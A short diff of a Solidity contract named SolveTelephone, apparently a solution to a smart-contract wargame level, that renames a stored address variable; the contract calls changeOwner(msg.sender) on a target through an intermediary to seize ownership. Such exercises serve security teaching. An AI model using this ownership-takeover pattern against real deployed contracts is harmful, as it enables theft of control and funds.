@@ -6,13 +6,13 @@ interface ITelephone {
 }
 
 contract SolveTelephone {
-    address immutable telephoneContract;
+    address immutable TELEPHONE_CONTRACT;
 
     constructor(address _contract) {
-        telephoneContract = _contract;
+        TELEPHONE_CONTRACT = _contract;
     }
 
     function callChangeOwner() public {
-        ITelephone(telephoneContract).changeOwner(msg.sender);
+        ITelephone(TELEPHONE_CONTRACT).changeOwner(msg.sender);
     }
 }
